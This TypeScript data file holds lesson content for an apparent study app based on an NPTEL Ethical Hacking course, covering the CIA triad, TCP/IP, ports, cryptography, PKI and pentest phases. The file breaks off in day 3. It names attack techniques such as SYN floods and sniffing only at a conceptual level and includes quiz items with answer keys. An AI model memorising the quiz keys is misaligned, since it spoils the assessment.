import { SprintDay } from '../types';

export const OFFICIAL_NPTEL_URL = 'https://onlinecourses.nptel.ac.in/e-learning/course/noc26_cs157';
export const OFFICIAL_COURSE_NAME = 'NPTEL: Ethical Hacking (noc26_cs157)';
export const COURSE_INSTRUCTOR = 'Prof. Indranil Sengupta (IIT Kharagpur)';

export const SPRINT_DAYS: SprintDay[] = [
  {
    dayNumber: 1,
    title: 'Cybersecurity Foundations & Networking',
    subtitle: 'CIA Triad, TCP/IP Suite, Ports & Threat Landscapes',
    estimatedTotalMinutes: 55,
    labTitle: 'TCP 3-Way Handshake & Packet Header Inspector',
    labDescription: 'Inspect SYN, SYN-ACK, ACK packet flags, sequence numbers, and IP header fields in a simulated network transaction.',
    labType: 'packet',
    learningObjectives: [
      'Understand the fundamental goals of information security: Confidentiality, Integrity, and Availability.',
      'Analyze the TCP/IP stack layers and contrast connection-oriented vs connectionless protocols.',
      'Trace the TCP 3-way handshake and understand why SYN Flood attacks exhaust server state tables.',
      'Differentiate between vulnerabilities, threats, exploit payloads, and attack surfaces.',
    ],
    topics: [
      {
        id: 'd1-t1',
        day: 1,
        title: 'Ethical Hacking Core Principles & CIA Triad',
        priority: 'P1',
        priorityRationale: 'Essential foundation for every cybersecurity domain and legal boundary definition in ethical hacking.',
        estimatedMinutes: 12,
        tags: ['Foundations', 'CIA Triad', 'Legal Scope'],
        explanation: {
          simpleDefinition: 'The core security model ensuring data is kept secret, untampered, and accessible to authorized parties.',
          conciseExplanation: 'Ethical hacking involves legally probing computer systems with prior written authorization to discover security weaknesses before malicious actors exploit them. All security measures serve the CIA Triad: Confidentiality (secrecy), Integrity (trustworthiness/non-tampering), and Availability (system uptime).',
          technicalDeepDive: 'In addition to CIA, modern frameworks incorporate Authenticity (verifying sender identity), Accountability (audit logs & non-repudiation), and the Parkerian Hexad (adding Utility and Possession). Ethical hackers operate strictly within a defined Scope of Work (SOW) and Rules of Engagement (ROE). Exceeding authorized boundaries violates cybersecurity statutes (e.g., Indian IT Act Section 43/66).',
          practicalAnalogy: 'Think of a secure bank safety deposit box: Confidentiality means only keyholders view contents; Integrity ensures nobody replaced genuine gold with fake metal; Availability guarantees the vault opens during business hours.',
          diagramWorkflow: `[Authorized Scope / ROE]
        │
        ├── Confidentiality ──► Encryption, Access Control, Need-to-know
        ├── Integrity       ──► Cryptographic Hashes, MACs, Digital Signatures
        └── Availability    ──► Redundancy, DDoS Mitigation, Backups`,
          importantTerminology: ['CIA Triad', 'Non-Repudiation', 'Scope of Work (SOW)', 'Rules of Engagement (ROE)', 'Zero-Day Vulnerability'],
          commonMisconceptions: [
            'Misconception: Penetration testing and ethical hacking are identical without written consent. Reality: Without explicit signed authorization, any unauthorized probing is a cyber crime regardless of intent.',
            'Misconception: Confidentiality automatically ensures Integrity. Reality: An encrypted file can still be flipped or truncated unless protected with authenticated encryption or integrity hashes.',
          ],
          officialNptelModule: 'Week 1: Introduction to Ethical Hacking',
          officialNptelLectureTitle: 'Lecture 01: Overview of Security and Vulnerabilities',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Security rests on the CIA Triad: Confidentiality, Integrity, Availability.',
            'Ethical hackers require written legal authorization defining scope, boundaries, and safe testing windows.',
            'Risk = Likelihood × Impact. Vulnerability is a flaw; Threat is the potential danger; Exploit is the code that leverages the flaw.',
          ],
          comparisonTable: {
            headers: ['Security Pillar', 'Core Goal', 'Breach Example', 'Defensive Control'],
            rows: [
              ['Confidentiality', 'Prevent unauthorized disclosure', 'Data leak / Plaintext credential sniffing', 'AES-256, TLS 1.3, RBAC'],
              ['Integrity', 'Prevent unauthorized modification', 'Man-in-the-Middle tampering / SQL injection data overwrite', 'SHA-256, HMAC, Code signing'],
              ['Availability', 'Ensure authorized accessibility', 'SYN Flood / Ransomware file locking', 'Rate-limiting, Load balancers, Redundancy'],
            ],
          },
          importantDistinctions: [
            'Threat: An adversary or event with potential to cause harm.',
            'Vulnerability: An internal architectural or coding weakness.',
            'Exploit: Software or technique used to take advantage of a vulnerability.',
          ],
          commonMistakes: [
            'Confusing penetration testing with passive vulnerability scanning.',
            'Assuming high encryption strength guarantees high system availability.',
          ],
          summary: 'Security governance starts with defining the CIA boundaries and operating within legally authorized engagement limits.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d1-1',
            question: 'An attacker modifies an in-flight bank transfer packet to change the recipient account number. Which pillar of the CIA triad is primarily breached?',
            options: ['Confidentiality', 'Integrity', 'Availability', 'Non-repudiation'],
            correctAnswer: 1,
            explanation: 'Integrity guarantees that data has not been modified, altered, or deleted in an unauthorized manner during transmission.',
          },
          {
            id: 'kc-d1-2',
            question: 'What is the decisive legal factor that separates an Ethical Hacker from a Black-Hat Hacker?',
            options: [
              'The types of automated tools utilized (e.g. Kali Linux vs Windows)',
              'Prior written authorization, signed Scope of Work, and explicit legal consent',
              'Whether the target website has a public bug bounty page',
              'Whether the hacker accepts monetary payment for findings',
            ],
            correctAnswer: 1,
            explanation: 'Written authorization and legal consent from the system owner is the fundamental legal difference between ethical hacking and unauthorized cyber crime.',
          },
        ],
      },
      {
        id: 'd1-t2',
        day: 1,
        title: 'TCP/IP Architecture, Packets & 3-Way Handshake',
        priority: 'P1',
        priorityRationale: 'TCP/IP packet exchange and state machines are prerequisites for all network scanning, sniffing, and protocol spoofing.',
        estimatedMinutes: 16,
        tags: ['Networking', 'TCP/IP', 'Handshake', 'SYN Flood'],
        explanation: {
          simpleDefinition: 'The transmission standard that governs how computers establish reliable data connections across networks.',
          conciseExplanation: 'Transmission Control Protocol (TCP) establishes a reliable, bidirectional stream using sequence numbers and acknowledgments. Before sending data, a client and server execute a 3-way handshake: SYN (Synchronize), SYN-ACK (Synchronize-Acknowledge), and ACK (Acknowledge).',
          technicalDeepDive: 'In TCP connection establishment: 1) Client picks Initial Sequence Number (ISN_c) and transmits packet with SYN flag set. 2) Server responds with SYN flag, ACK flag, ACK number = ISN_c + 1, and its own ISN_s. 3) Client sends ACK with ACK number = ISN_s + 1. If an attacker sends rapid SYN packets with spoofed source IPs without completing the final ACK, the server backlog queue fills up (TCP SYN Flood DoS). Defenses include SYN Cookies and half-open connection timeouts.',
          practicalAnalogy: 'Like making a phone call: You say "Hello, can you hear me?" (SYN). The receiver says "Yes I hear you, can you hear me?" (SYN-ACK). You reply "Yes, loud and clear!" (ACK). Once both confirm, the conversation begins.',
          diagramWorkflow: `Client                                Server
  │                                     │
  ├─── [1] SYN (seq=X) ────────────────►│ (Allocates TCB / Half-open state)
  │                                     │
  │◄── [2] SYN-ACK (seq=Y, ack=X+1) ───┤
  │                                     │
  ├─── [3] ACK (seq=X+1, ack=Y+1) ─────►│ (Connection Established!)
  │                                     │
  └─── [4] Data Exchange (PSH/ACK) ────►│`,
          importantTerminology: ['SYN / ACK / FIN / RST / PSH / URG Flags', 'ISN (Initial Sequence Number)', 'Transmission Control Block (TCB)', 'SYN Cookies', 'Half-Open Connection'],
          commonMisconceptions: [
            'Misconception: UDP is unsafe so it is never used in real protocols. Reality: UDP is connectionless and lightweight; DNS, DHCP, and live video streaming require UDP for low latency despite lack of native reliability.',
            'Misconception: Sequence numbers in TCP always start at 0. Reality: Modern operating systems use cryptographically randomized Initial Sequence Numbers (ISNs) to prevent TCP sequence prediction hijacking.',
          ],
          officialNptelModule: 'Week 1: Basics of Computer Networks & Protocols',
          officialNptelLectureTitle: 'Lecture 03: TCP/IP Protocol Stack and TCP Handshake',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'TCP provides reliable, ordered byte delivery; UDP provides connectionless best-effort delivery.',
            'The 3-way handshake uses SYN, SYN-ACK, and ACK flags to synchronize sequence numbers.',
            'SYN Flood attacks abuse the half-open backlog queue before the final ACK arrives.',
            'SYN Cookies mitigate SYN floods by encoding connection parameters into the server ISN without storing state.',
          ],
          comparisonTable: {
            headers: ['Feature', 'TCP (Transmission Control Protocol)', 'UDP (User Datagram Protocol)'],
            rows: [
              ['Connection Type', 'Connection-oriented (Requires 3-way handshake)', 'Connectionless (Fire-and-forget)'],
              ['Reliability', 'Guaranteed delivery, checksums, retransmission', 'No delivery guarantee, no retransmission'],
              ['Header Overhead', '20–60 bytes (flags, window, seq/ack)', '8 bytes fixed'],
              ['Primary Vulnerabilities', 'SYN Flood, TCP Session Hijacking, Reset attack', 'UDP Amplification (DNS/NTP), IP Spoofing'],
            ],
          },
          importantDistinctions: [
            'RST (Reset): Instantly tears down an invalid or rejected connection.',
            'FIN (Finish): Gracefully closes the connection from the sender side.',
          ],
          commonMistakes: [
            'Believing TCP sequence numbers increase by 1 for each packet sent regardless of payload size (they increase by byte length of payload).',
          ],
          summary: 'Mastering TCP state transitions is essential for understanding Nmap stealth scans, firewall state tracking, and DoS mechanisms.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d1-3',
            question: 'During a TCP 3-way handshake, if the client sends a SYN with sequence number 5000, what will be the acknowledgment number in the server\'s SYN-ACK response?',
            options: ['5000', '5001', '0', 'Random 32-bit number'],
            correctAnswer: 1,
            explanation: 'The server acknowledges the SYN by incrementing the client Initial Sequence Number by 1 (5000 + 1 = 5001).',
          },
        ],
      },
      {
        id: 'd1-t3',
        day: 1,
        title: 'Common Ports, Critical Protocols & Attack Vectors',
        priority: 'P2',
        priorityRationale: 'Security reconnaissance begins with identifying exposed listening ports and their associated service vulnerabilities.',
        estimatedMinutes: 14,
        tags: ['Ports', 'DNS', 'HTTP/HTTPS', 'SSH', 'Reconnaissance'],
        explanation: {
          simpleDefinition: 'Standardized network communication endpoints assigned to specific services and application protocols.',
          conciseExplanation: 'TCP and UDP port numbers range from 0 to 65535, divided into Well-Known (0-1023), Registered (1024-49151), and Dynamic/Private (49152-65535). Ethical hackers inspect which ports are open to map the attack surface.',
          technicalDeepDive: 'Standard ports: 21 (FTP - plaintext credentials), 22 (SSH - encrypted shell), 23 (Telnet - unencrypted legacy), 25 (SMTP - email relay), 53 (DNS - UDP/TCP 53 for zone transfers), 80 (HTTP), 443 (HTTPS/TLS), 445 (SMB - exploited by EternalBlue / WannaCry), 3389 (RDP - remote desktop). Plaintext protocols (Telnet, FTP, HTTP) are susceptible to passive network sniffing and ARP spoofing MitM attacks.',
          practicalAnalogy: 'Think of an IP address as an apartment building address, and port numbers as individual apartment doors. Port 22 is the fortified digital door with a biometric lock (SSH); Port 23 is a screen door with no latch (Telnet).',
          diagramWorkflow: `Attacker Sniffer (Wireshark)
        │
        ├── Port 23 (Telnet): [admin / P@ssw0rd123]  ──► Plaintext Leak!
        ├── Port 21 (FTP):    [USER alice / PASS secret] ─► Plaintext Leak!
        └── Port 22 (SSH):    [Diffie-Hellman / AES] ──► Strong Encrypted Tunnel`,
          importantTerminology: ['Well-Known Ports (0-1023)', 'Ephemeral Ports', 'Zone Transfer (AXFR)', 'SMB Port 445', 'Cleartext vs Ciphertext'],
          commonMisconceptions: [
            'Misconception: Changing port 22 to port 2222 provides total security. Reality: Security through obscurity only delays detection; port scanners like Nmap easily discover services via service version detection (-sV).',
          ],
          officialNptelModule: 'Week 1: Network Protocols and Port Services',
          officialNptelLectureTitle: 'Lecture 04: Vulnerabilities in Common Internet Protocols',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Never transmit sensitive credentials over cleartext protocols (Telnet 23, FTP 21, HTTP 80).',
            'Port 445 (SMB) has been historically high-risk for wormable remote code execution vulnerabilities.',
            'DNS runs on UDP 53 for queries, but utilizes TCP 53 for zone transfers (AXFR) and large responses (>512 bytes).',
          ],
          comparisonTable: {
            headers: ['Port Number', 'Protocol', 'Transport', 'Security Consideration'],
            rows: [
              ['22', 'SSH', 'TCP', 'Secure encrypted shell; replace password login with SSH key pairs.'],
              ['23', 'Telnet', 'TCP', 'Obsolete; plaintext credentials vulnerable to Wireshark sniffing.'],
              ['53', 'DNS', 'UDP / TCP', 'UDP queries vulnerable to DNS spoofing/cache poisoning; disable open AXFR zone transfers.'],
              ['445', 'SMB', 'TCP', 'File sharing protocol; block at perimeter firewall to prevent lateral malware movement.'],
            ],
          },
          importantDistinctions: [
            'Port Scanning: Discovering which ports are listening.',
            'Banner Grabbing: Interrogating open ports to extract service version numbers and OS hints.',
          ],
          commonMistakes: [
            'Leaving DNS Zone Transfers (AXFR) unrestricted to the public internet, exposing internal hostnames.',
          ],
          summary: 'Restricting unnecessary open ports through default-deny firewall policies is the most fundamental perimeter defense.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d1-4',
            question: 'Which of the following ports and protocol pairs transmits passwords across the network in unencrypted plaintext?',
            options: ['Port 22 (SSH)', 'Port 23 (Telnet)', 'Port 443 (HTTPS)', 'Port 993 (IMAPS)'],
            correctAnswer: 1,
            explanation: 'Telnet (Port 23) does not provide encryption, meaning every keystroke including passwords traverses the wire in plaintext.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 2,
    title: 'Cryptography & Authentication',
    subtitle: 'Symmetric/Asymmetric Ciphers, Hashing, PKI & Access Control',
    estimatedTotalMinutes: 60,
    labTitle: 'Cryptographic Hashing & Key Pair Sandbox',
    labDescription: 'Demonstrate the SHA-256 Avalanche Effect, compare MD5 collisions, and simulate RSA Public/Private key encryption and signing.',
    labType: 'crypto',
    learningObjectives: [
      'Compare symmetric encryption (AES, DES) and asymmetric encryption (RSA, ECC) mechanisms.',
      'Analyze the mathematical properties of one-way cryptographic hash functions and collision resistance.',
      'Explain how Public Key Infrastructure (PKI), digital certificates, and digital signatures establish trust.',
      'Evaluate authentication mechanisms: MFA, salting passwords, and Role-Based Access Control (RBAC).',
    ],
    topics: [
      {
        id: 'd2-t1',
        day: 2,
        title: 'Symmetric vs. Asymmetric Encryption',
        priority: 'P1',
        priorityRationale: 'Essential cryptographic foundation tested in virtually every ethical hacking and network security examination.',
        estimatedMinutes: 18,
        tags: ['Cryptography', 'AES', 'RSA', 'Key Exchange'],
        explanation: {
          simpleDefinition: 'Methods of encoding data using single shared keys (symmetric) or mathematically linked key pairs (asymmetric).',
          conciseExplanation: 'Symmetric encryption (AES, 3DES, ChaCha20) uses a single secret key for both encryption and decryption. It is fast and computationally lightweight. Asymmetric encryption (RSA, ECC) uses two mathematically linked keys: a Public Key (freely shared) and a Private Key (kept strictly confidential).',
          technicalDeepDive: 'Symmetric algorithms operate in modes: ECB (insecure; leaks patterns), CBC (requires IV, vulnerable to padding oracle attacks), and GCM (Galois/Counter Mode: provides authenticated encryption AEAD). Asymmetric algorithms rely on hard mathematical problems: integer factorization of large primes (RSA) or discrete logarithm over elliptic curves (ECC). In modern TLS 1.3, hybrid encryption is used: Asymmetric key exchange (Diffie-Hellman) establishes a temporary session key, followed by symmetric AES-GCM for high-speed bulk data encryption.',
          practicalAnalogy: 'Symmetric: A physical padlock where both you and your friend have an exact duplicate key. Asymmetric: A public mailbox where anyone can drop a letter inside the slot (Public Key), but only the postal worker holds the key to open the back and read the letters (Private Key).',
          diagramWorkflow: `[Hybrid TLS Encryption Model]
  1. Client & Server perform Asymmetric Handshake (Diffie-Hellman / RSA)
        ▼
  2. Securely agree upon ephemeral Symmetric Session Key (AES-256-GCM)
        ▼
  3. Bulk application payload encrypted symmetrically at gigabit speeds!`,
          importantTerminology: ['AES (Advanced Encryption Standard)', 'RSA', 'Elliptic Curve Cryptography (ECC)', 'Cipher Modes (ECB, CBC, GCM)', 'Diffie-Hellman Key Exchange'],
          commonMisconceptions: [
            'Misconception: RSA is safer than AES because it uses two keys. Reality: RSA is mathematically slower and suited for key exchange or signing; AES-256 is stronger against brute force per bit and faster for bulk data.',
            'Misconception: ECB mode is acceptable if AES is used. Reality: Electronic Codebook (ECB) encrypts identical plaintext blocks into identical ciphertext blocks, preserving visual outlines (the classic ECB Penguin).',
          ],
          officialNptelModule: 'Week 2: Cryptographic Concepts in Hacking',
          officialNptelLectureTitle: 'Lecture 06: Symmetric vs Asymmetric Cryptosystems',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Symmetric: 1 key (shared secret). High speed, ideal for files and streams (AES-128/256).',
            'Asymmetric: 2 keys (Public + Private). Slower, solves key distribution problem (RSA, ECC).',
            'TLS uses hybrid encryption: Asymmetric for key agreement + Symmetric for data transfer.',
            'Never use ECB cipher mode; always prefer authenticated encryption like AES-GCM.',
          ],
          comparisonTable: {
            headers: ['Characteristic', 'Symmetric Encryption', 'Asymmetric Encryption'],
            rows: [
              ['Key Count', '1 Shared Secret Key', '2 Mathematically paired keys (Public & Private)'],
              ['Computational Speed', 'Very fast (hardware accelerated in CPUs)', '100x to 1000x slower due to modular arithmetic'],
              ['Key Distribution', 'Difficult (must securely share secret in advance)', 'Easy (public key can be freely distributed)'],
              ['Standard Algorithms', 'AES, DES, 3DES, ChaCha20', 'RSA, ECC, Diffie-Hellman, DSA'],
            ],
          },
          importantDistinctions: [
            'Encrypt with Public Key = Only Private Key holder can Decrypt (Confidentiality).',
            'Sign with Private Key = Anyone with Public Key can Verify (Authenticity & Non-Repudiation).',
          ],
          commonMistakes: [
            'Confusing Digital Signatures (Private key encryption of hash) with Confidentiality encryption.',
          ],
          summary: 'Modern internet security relies on the synergy of asymmetric key establishment and symmetric high-throughput data pipelines.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d2-1',
            question: 'If Alice wants to send an encrypted confidential message to Bob using asymmetric cryptography, which key must Alice use to encrypt the message?',
            options: ['Alice\'s Private Key', 'Alice\'s Public Key', 'Bob\'s Public Key', 'Bob\'s Private Key'],
            correctAnswer: 2,
            explanation: 'Alice must encrypt with Bob\'s Public Key. Because only Bob possesses his corresponding Private Key, only Bob can decrypt and read the message.',
          },
        ],
      },
      {
        id: 'd2-t2',
        day: 2,
        title: 'Cryptographic Hash Functions & Integrity',
        priority: 'P1',
        priorityRationale: 'Hashes underpin password storage, digital forensics verification, and tamper detection.',
        estimatedMinutes: 16,
        tags: ['Hashing', 'SHA-256', 'MD5 Collisions', 'Integrity'],
        explanation: {
          simpleDefinition: 'A mathematical algorithm that converts arbitrary data into a fixed-length fingerprint that cannot be reversed.',
          conciseExplanation: 'Cryptographic hash functions take any input size and produce a deterministic fixed-size digest (e.g., SHA-256 produces 256 bits). They are strictly one-way (pre-image resistant) and exhibit the Avalanche Effect: changing a single bit in the input drastically alters over 50% of the output bits.',
          technicalDeepDive: 'Essential properties: 1) Pre-image resistance (given h, hard to find m such that H(m) = h). 2) Second pre-image resistance (given m1, hard to find m2 such that H(m1) = H(m2)). 3) Collision resistance (hard to find any two arbitrary m1, m2 such that H(m1) = H(m2)). MD5 (128-bit) and SHA-1 (160-bit) are cryptographically broken due to practical collision attacks. SHA-256, SHA-3, and BLAKE3 are secure modern standards. For password storage, fast hashes like SHA-256 must NOT be used alone; computationally expensive salted KDFs (Argon2, bcrypt, PBKDF2) are mandatory to prevent GPU brute-forcing.',
          practicalAnalogy: 'Making a fruit smoothie: You can put bananas and strawberries in a blender and get a unique smoothie (hash). But looking at the smoothie, you cannot unscramble it back into intact fruit (one-way property).',
          diagramWorkflow: `Input Data: "Hello World"  ──► SHA-256 ──► d5579c46dfcc7f1820...
Input Data: "Hello World!" ──► SHA-256 ──► 7f83b1657ff1fc53b9...
               ▲
               └─ Single punctuation change triggers 50%+ bit flip (Avalanche Effect!)`,
          importantTerminology: ['Deterministic', 'Pre-image Resistance', 'Collision Resistance', 'Avalanche Effect', 'Salt', 'Rainbow Table'],
          commonMisconceptions: [
            'Misconception: Hashing is a form of encryption that can be "decrypted" with the right tool. Reality: Hashing is one-way lossy compression; it is mathematically irreversible. "Decryption" sites merely lookup pre-computed hashes in rainbow tables.',
            'Misconception: Storing passwords as plain MD5 or SHA-256 is secure. Reality: Attackers can compute billions of SHA-256 hashes per second on consumer GPUs; passwords require slow, memory-hard algorithms with unique salts (bcrypt/Argon2id).',
          ],
          officialNptelModule: 'Week 2: Cryptographic Hash Functions and MAC',
          officialNptelLectureTitle: 'Lecture 08: Hash Functions, SHA-256 and Attacks',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Hashes are one-way and fixed-length (MD5: 128b, SHA-1: 160b, SHA-256: 256b).',
            'MD5 and SHA-1 are deprecated due to collision attacks.',
            'The Avalanche Effect ensures small input changes create completely different output digests.',
            'Salting passwords adds a random string to each password before hashing, defeating precomputed rainbow tables.',
          ],
          comparisonTable: {
            headers: ['Algorithm', 'Digest Size', 'Collision Status', 'Recommended Use'],
            rows: [
              ['MD5', '128 bits', 'Broken (Collisions generated in seconds)', 'Non-cryptographic checksums only (file integrity verification against noise)'],
              ['SHA-1', '160 bits', 'Broken (SHAttered attack demonstrated)', 'Legacy compatibility; phase out completely'],
              ['SHA-256', '256 bits', 'Secure (No known practical collisions)', 'Digital signatures, TLS certificates, blockchain'],
              ['Argon2id / bcrypt', 'Configurable', 'Secure (Memory-hard & adaptive work factor)', 'Password storage & key derivation'],
            ],
          },
          importantDistinctions: [
            'Encryption: Two-way (Reversible with key).',
            'Hashing: One-way (Irreversible, no key).',
            'Encoding (e.g., Base64): Format conversion (Not security, easily reversed by anyone).',
          ],
          commonMistakes: [
            'Confusing Base64 encoding with encryption or hashing.',
          ],
          summary: 'Cryptographic hashes provide unambiguous proof of data integrity when collision resistance is guaranteed.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d2-2',
            question: 'What security property ensures that an attacker cannot find any two different input messages that produce the exact same hash output?',
            options: ['Pre-image resistance', 'Collision resistance', 'Non-repudiation', 'Confusion and Diffusion'],
            correctAnswer: 1,
            explanation: 'Collision resistance guarantees that it is computationally infeasible to locate two distinct messages m1 and m2 such that Hash(m1) = Hash(m2).',
          },
        ],
      },
      {
        id: 'd2-t3',
        day: 2,
        title: 'Digital Signatures, PKI & X.509 Certificates',
        priority: 'P2',
        priorityRationale: 'Explains how the internet authenticates web servers, code integrity, and email senders without trusting third parties blind.',
        estimatedMinutes: 14,
        tags: ['PKI', 'Certificates', 'Digital Signatures', 'X.509'],
        explanation: {
          simpleDefinition: 'The hierarchical framework of Certificate Authorities (CAs) that binds cryptographic public keys to verified digital identities.',
          conciseExplanation: 'A Digital Signature is created by calculating the cryptographic hash of a message and encrypting that hash with the sender\'s private key. Anyone with the sender\'s public key can decrypt the signature and verify that the message was not modified and truly originated from the signer. Public Key Infrastructure (PKI) uses trusted Certificate Authorities (CAs) to issue signed X.509 certificates that validate public keys.',
          technicalDeepDive: 'In TLS certificate chains: The Root CA signs Intermediate CAs, which sign the leaf certificate for domain.com. Browsers trust Root CAs pre-installed in the OS trust store. Revocation is handled via CRLs (Certificate Revocation Lists) or OCSP (Online Certificate Status Protocol) stapling. If an attacker injects a malicious Root CA into a client device, they can perform transparent SSL/TLS interception (MitM proxying).',
          practicalAnalogy: 'A Digital Signature is like a wax seal stamped with an emperor’s unique signet ring. An X.509 certificate is like a government-issued passport stating: "The government (CA) certifies that this face and signature belong to Alice".',
          diagramWorkflow: `Sender (Alice)                         Receiver (Bob)
  │                                       │
  ├─── Message + Hash(Message) ───────────► Decrypts Sig using Alice Public Key
  │          ▲                            │             ▼
  │          └─ Encrypted with Alice Priv │ Yields Original Hash!
  │             (Digital Signature)       │ Bob computes Hash(Message)
  │                                       │ If Hashes Match ──► Authenticated!`,
          importantTerminology: ['Certificate Authority (CA)', 'X.509 Standard', 'Certificate Revocation List (CRL)', 'OCSP Stapling', 'Non-Repudiation'],
          commonMisconceptions: [
            'Misconception: A digital signature encrypts the entire original message. Reality: It only encrypts the small, fixed-length hash of the message to maximize speed.',
          ],
          officialNptelModule: 'Week 2: Public Key Infrastructure and Authentication',
          officialNptelLectureTitle: 'Lecture 09: Digital Signatures and X.509 Certificates',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Digital signature = Hash of message encrypted with the sender’s private key.',
            'Provides Authentication, Integrity, and Non-repudiation.',
            'X.509 certificates bind a subject identity (domain/organization) to a public key via a CA signature.',
          ],
          comparisonTable: {
            headers: ['Mechanism', 'Primary Goal', 'Key Used to Generate', 'Key Used to Verify'],
            rows: [
              ['Digital Signature', 'Integrity & Non-repudiation', 'Signer\'s Private Key', 'Signer\'s Public Key'],
              ['Asymmetric Encryption', 'Confidentiality', 'Recipient\'s Public Key', 'Recipient\'s Private Key'],
              ['HMAC', 'Message Authentication & Integrity', 'Shared Symmetric Secret Key', 'Shared Symmetric Secret Key'],
            ],
          },
          importantDistinctions: [
            'CA Compromise: If a Root CA is hacked, attackers can issue rogue valid certificates for any domain (e.g., DigiNotar incident).',
          ],
          commonMistakes: [
            'Assuming HTTPS encryption means the website is safe from phishing (a phishing site can obtain a valid free Let’s Encrypt TLS certificate).',
          ],
          summary: 'PKI transforms mathematical public key pairs into real-world trusted identities through cryptographically signed certificate hierarchies.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d2-3',
            question: 'What ensures Non-Repudiation when an author sends a digitally signed document?',
            options: [
              'The document is encrypted with symmetric AES-256',
              'Only the author holds the unique private key used to generate the signature',
              'The document was sent over an HTTPS connection',
              'The hash algorithm used was SHA-1',
            ],
            correctAnswer: 1,
            explanation: 'Because the private key is held exclusively by the signer, they cannot credibly deny having originated the signature (Non-Repudiation).',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 3,
    title: 'Ethical Hacking Methodology & Reconnaissance',
    subtitle: 'Hacking Phases, Passive OSINT, Active Footprinting & Scoping',
    estimatedTotalMinutes: 50,
    labTitle: 'Interactive OSINT & Footprinting Console',
    labDescription: 'Simulate WHOIS queries, DNS zone lookups, subdomain enumeration, and Google Dorking techniques on authorized synthetic domains.',
    labType: 'nmap',
    learningObjectives: [
      'Master the five official phases of ethical hacking: Reconnaissance, Scanning, Gaining Access, Maintaining Access, Clearing Tracks.',
      'Differentiate passive reconnaissance (OSINT, WHOIS, DNS) from active footprinting.',
      'Construct advanced search operators (Google Dorking) for finding leaked assets.',
      'Define the boundaries of ethical disclosure and vulnerability reporting.',
    ],
    topics: [
      {
        id: 'd3-t1',
        day: 3,
        title: 'The Five Phases of Ethical Hacking & Scoping',
        priority: 'P1',
        priorityRationale: 'Structured methodology framework tested across all modules and certification syllabi.',
        estimatedMinutes: 14,
        tags: ['Methodology', 'Five Phases', 'ROE', 'Scoping'],
        explanation: {
          simpleDefinition: 'The standardized sequence of steps followed by ethical security professionals to assess target resilience.',
          conciseExplanation: 'Penetration testing follows 5 sequential phases: 1) Reconnaissance (gathering intelligence), 2) Scanning & Enumeration (probing live hosts, ports, and services), 3) Gaining Access (exploiting discovered vulnerabilities), 4) Maintaining Access (assessing persistence and privilege escalation), and 5) Clearing Tracks / Reporting (ethical hackers document every step and clean up artifacts rather than hiding evidence).',
          technicalDeepDive: 'In real penetration engagements, Ethical Hackers differ sharply from Black Hats in Phase 5: Instead of deleting system event logs or installing rootkits to hide their tracks, ethical testers clean up test accounts, revert modified files, and produce an Executive & Technical Remediation Report detailing CVSS scores, remediation timelines, and proof-of-concept steps.',
          practicalAnalogy: 'Like building security audit: 1) Observing exterior guards and schedules (Recon), 2) Checking which doors and windows are unlocked (Scanning), 3) Slipping through an unlocked window (Gaining access), 4) Checking if you could hide in the basement unnoticed (Maintaining access), 5) Walking to the building owner with a full written audit checklist (Reporting).',
          diagramWorkflow: `[Phase 1: Reconnaissance] ──► Passive OSINT & Target Intelligence
             ▼
[Phase 2: Scanning]        ──► Port scanning, service fingerprinting, vuln mapping
             ▼
[Phase 3: Gaining Access]  ──► Exploit verification, privilege acquisition
             ▼
[Phase 4: Maintaining]     ──► Persistence simulation, lateral movement scope
             ▼
[Phase 5: Reporting & Remediation] ──► Documentation, log analysis, remediation!`,
          importantTerminology: ['Reconnaissance', 'Scanning', 'Gaining Access', 'Maintaining Access', 'Post-Exploitation', 'Remediation Report'],
          commonMisconceptions: [
            'Misconception: Ethical hackers secretly delete server logs so administrators don\'t know they entered. Reality: Deleting logs is black-hat behavior; ethical testers coordinate with Blue Teams and leave audit trails.',
          ],
          officialNptelModule: 'Week 3: Phases of Hacking and Footprinting',
          officialNptelLectureTitle: 'Lecture 11: Penetration Testing Methodologies and Phases',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            '5 Phases: Reconnaissance ➔ Scanning ➔ Gaining Access ➔ Maintaining Access ➔ Analysis & Reporting.',
            'Passive Recon sends zero direct traffic to target servers; Active Recon sends exploratory packets.',
            'Deliverables must include actionable remediation steps prioritized by risk severity.',
          ],
          comparisonTable: {
            headers: ['Phase', 'Activity', 'Typical Tools', 'Target Awareness'],
            rows: [
              ['Reconnaissance', 'Gathering emails, subdomains, IP ranges', 'WHOIS, Shodan, Maltego, Google Dorks', 'None (if passive)'],
              ['Scanning', 'Probing ports, OS detection, banner grabs', 'Nmap, Masscan, Nessus', 'High (logged by IDS/firewalls)'],
              ['Gaining Access', 'Exploiting software flaws, SQLi, buffer overflows', 'Metasploit, Burp Suite, SQLmap', 'High (generates alerts)'],
              ['Reporting', 'Detailed technical & executive vulnerability breakdown', 'CVSS, Markdown, Remediation Tracker', 'Primary stakeholder review'],
            ],
          },
          importantDistinctions: [
            'Vulnerability Assessment: Identifies list of potential flaws without active exploitation.',
            'Penetration Testing: Actually exploits flaws to prove real-world business impact and lateral reach.',
          ],
          commonMistakes: [
            'Proceeding to exploit systems outside the defined IP range in the Rules of Engagement.',
          ],
          summary: 'A disciplined methodology ensures thorough coverage and protects organizations from uncoordinated service outages.',
